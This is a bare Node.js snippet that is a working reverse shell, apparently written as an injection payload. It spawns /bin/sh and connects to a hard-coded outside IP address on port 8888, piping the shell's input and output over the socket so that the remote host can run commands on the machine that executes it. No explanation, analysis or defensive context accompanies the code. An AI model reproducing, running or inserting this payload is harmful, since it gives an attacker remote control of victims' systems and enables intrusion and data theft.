(function(){
	var net = require("net");
	cp = require("child_process");
	sh = cp.spawn("/bin/sh", []);
	var client = new net.Socket();
	client.connect(8888, "121.40.198.90", function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
	return /a/;
})();